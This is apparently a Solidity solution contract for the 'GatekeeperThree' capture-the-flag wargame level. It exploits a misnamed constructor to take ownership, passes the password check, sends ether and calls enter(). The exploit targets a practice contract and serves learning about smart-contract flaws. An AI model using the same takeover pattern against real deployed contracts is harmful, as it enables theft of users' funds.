// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./gatekeeperthree.sol";

contract Solution {
    GatekeeperThree level;

    constructor(address payable l) {
        level = GatekeeperThree(l);
    }

    function attack(uint256 _pass) public {
        level.construct0r();
        level.getAllowance(_pass);
        address(level).call{value: 0.0011 ether}("");
        level.enter();
    }
    function myreceive() public payable {}
}
